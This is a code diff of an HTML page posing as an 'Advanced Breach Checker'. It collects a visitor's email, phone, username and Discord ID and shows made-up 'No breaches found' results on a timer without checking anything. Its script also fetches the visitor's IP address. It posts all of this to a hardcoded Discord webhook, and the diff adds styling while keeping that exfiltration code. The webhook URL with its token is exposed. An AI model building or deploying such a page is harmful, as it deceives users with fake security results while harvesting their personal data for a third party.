@@ -15,32 +15,67 @@
     input:focus { border-color: var(--c); outline: none; }
     button { background-color: var(--c); color: black; padding: 10px 20px; font-size: 1rem; border: none; border-radius: 8px; cursor: pointer; transition: background-color 0.3s ease; margin-top: 1rem; }
     button:hover { background-color: #1f6feb; }
-    .z { margin-top: 1rem; width: 100%; }
-    .r { background: var(--b); border: 1px solid #30363d; border-left: 6px solid var(--c); padding: 1rem; border-radius: 12px; font-size: 1rem; white-space: pre-wrap; margin-bottom: 1rem; box-shadow: 0 0 14px rgba(0, 0, 0, 0.3); }
+    .z { margin-top: 2rem; width: 100%; max-width: 600px; text-align: left; }
+    .r { background: var(--b); border: 1px solid #30363d; border-left: 6px solid var(--c); padding: 1rem; border-radius: 12px; font-size: 1rem; white-space: pre-wrap; margin-bottom: 1rem; box-shadow: 0 0 14px rgba(0, 0, 0, 0.3); transition: border-left-color 0.3s, background-color 0.3s; }
+    .success { border-left-color: var(--d); background-color: #1e2a1e; }
+    .warning { border-left-color: var(--e); background-color: #2a1e1e; }
   </style>
 </head>
 <body>
   <div class="x" id="a"><h1>Do You Consent?</h1><p>By proceeding, you agree to the collection and logging of your input data (email, phone, username, and Discord ID) for breach-checking purposes.</p><button onclick="b()">Yes, I Consent</button></div>
   <div class="y" id="b" style="display: none;"><h1>🛡️ Advanced Breach Checker</h1><input id="c" type="text" placeholder="📧 Enter email address" /><input id="d" type="text" placeholder="📱 Enter phone number" /><input id="e" type="text" placeholder="👤 Enter username" /><input id="f" type="text" placeholder="💬 Enter Discord ID" /><button onclick="g()">🔍 Search</button></div>
-  <div class="z" id="c" style="display: none;"><div id="h" class="r">Results for email will appear here...</div><div id="i" class="r">Results for phone will appear here...</div><div id="j" class="r">Results for username will appear here...</div><div id="k" class="r">Results for Discord ID will appear here...</div></div>
+  <div class="z" id="results" style="display: none;">
+    <h1 style="margin-bottom: 1rem; font-size: 1.5rem; color: var(--c);">🔎 Search Results</h1>
+    <div id="h" class="r">Results for email will appear here...</div>
+    <div id="i" class="r">Results for phone will appear here...</div>
+    <div id="j" class="r">Results for username will appear here...</div>
+    <div id="k" class="r">Results for Discord ID will appear here...</div>
+  </div>
   <script>
-    function b() { document.getElementById('a').style.display = 'none'; document.getElementById('b').style.display = 'block'; document.getElementById('c').style.display = 'block'; }
-    async function g() {
-      const a = document.getElementById('c').value.trim(), b = document.getElementById('d').value.trim(), c = document.getElementById('e').value.trim(), d = document.getElementById('f').value.trim();
-      document.getElementById('h').textContent = '⏳ Searching email...';
-      document.getElementById('i').textContent = '⏳ Searching phone...';
-      document.getElementById('j').textContent = '⏳ Searching username...';
-      document.getElementById('k').textContent = '⏳ Searching Discord...';
-      k(a, b, c, d);
-      if (a) setTimeout(() => document.getElementById('h').textContent = '✅ Email checked: No breaches found!', 1500);
-      else document.getElementById('h').textContent = '⚠️ No email entered.';
-      if (b) setTimeout(() => document.getElementById('i').textContent = '✅ Phone checked: No breaches found!', 1500);
-      else document.getElementById('i').textContent = 'ℹ️ Phone check skipped.';
-      if (c) setTimeout(() => document.getElementById('j').textContent = '✅ Username checked: No breaches found!', 1500);
-      else document.getElementById('j').textContent = 'ℹ️ Username check skipped.';
-      if (d) setTimeout(() => document.getElementById('k').textContent = '✅ Discord ID checked: No breaches found!', 1500);
-      else document.getElementById('k').textContent = 'ℹ️ Discord check skipped.';
+    function b() {
+      document.getElementById('a').style.display = 'none';
+      document.getElementById('b').style.display = 'block';
+      document.getElementById('results').style.display = 'block';
     }
+
+    async function g() {
+      const a = document.getElementById('c').value.trim(),
+            b = document.getElementById('d').value.trim(),
+            c = document.getElementById('e').value.trim(),
+            d = document.getElementById('f').value.trim();
+
+      // Show loading state
+      updateResult('h', '⏳ Searching email...', '');
+      updateResult('i', '⏳ Searching phone...', '');
+      updateResult('j', '⏳ Searching username...', '');
+      updateResult('k', '⏳ Searching Discord...', '');
+
+      k(a, b, c, d);
+
+      // Simulated results
+      if (a) setTimeout(() => updateResult('h', '✅ Email checked: No breaches found!', 'success'), 1500);
+      else updateResult('h', '⚠️ No email entered.', 'warning');
+
+      if (b) setTimeout(() => updateResult('i', '✅ Phone checked: No breaches found!', 'success'), 1500);
+      else updateResult('i', 'ℹ️ Phone check skipped.', 'warning');
+
+      if (c) setTimeout(() => updateResult('j', '✅ Username checked: No breaches found!', 'success'), 1500);
+      else updateResult('j', 'ℹ️ Username check skipped.', 'warning');
+
+      if (d) setTimeout(() => updateResult('k', '✅ Discord ID checked: No breaches found!', 'success'), 1500);
+      else updateResult('k', 'ℹ️ Discord check skipped.', 'warning');
+
+      // Smooth scroll to results
+      document.getElementById('results').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function updateResult(id, text, type) {
+      const el = document.getElementById(id);
+      el.textContent = text;
+      el.classList.remove('success', 'warning');
+      if (type) el.classList.add(type);
+    }
+
     async function k(a, b, c, d) {
       const e = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
       let f = "Unavailable";
@@ -48,8 +83,27 @@
         const g = await fetch("https://api.ipify.org?format=json"), h = await g.json();
         f = h.ip;
       } catch (i) { console.warn("IP fetch failed:", i); }
-      const j = { username: "Breach Checker Log", avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png", embeds: [{ title: "🔍 New Breach Search Attempt", color: 0x5865F2, fields: [{ name: "📧 Email", value: a || "Not provided", inline: false }, { name: "📱 Phone", value: b || "Not provided", inline: false }, { name: "👤 Username", value: c || "Not provided", inline: false }, { name: "💬 Discord ID", value: d || "Not provided", inline: false }, { name: "🌐 IP Address", value: f, inline: false }, { name: "🕒 Time", value: new Date().toUTCString(), inline: false }] }] };
-      try { await fetch(e, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(j) }); } catch (k) { console.error("Webhook error:", k); }
+      const j = {
+        username: "Breach Checker Log",
+        avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
+        embeds: [{
+          title: "🔍 New Breach Search Attempt",
+          color: 0x5865F2,
+          fields: [
+            { name: "📧 Email", value: a || "Not provided", inline: false },
+            { name: "📱 Phone", value: b || "Not provided", inline: false },
+            { name: "👤 Username", value: c || "Not provided", inline: false },
+            { name: "💬 Discord ID", value: d || "Not provided", inline: false },
+            { name: "🌐 IP Address", value: f, inline: false },
+            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
+          ]
+        }]
+      };
+      try {
+        await fetch(e, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(j) });
+      } catch (k) {
+        console.error("Webhook error:", k);
+      }
     }
   </script>
 </body>
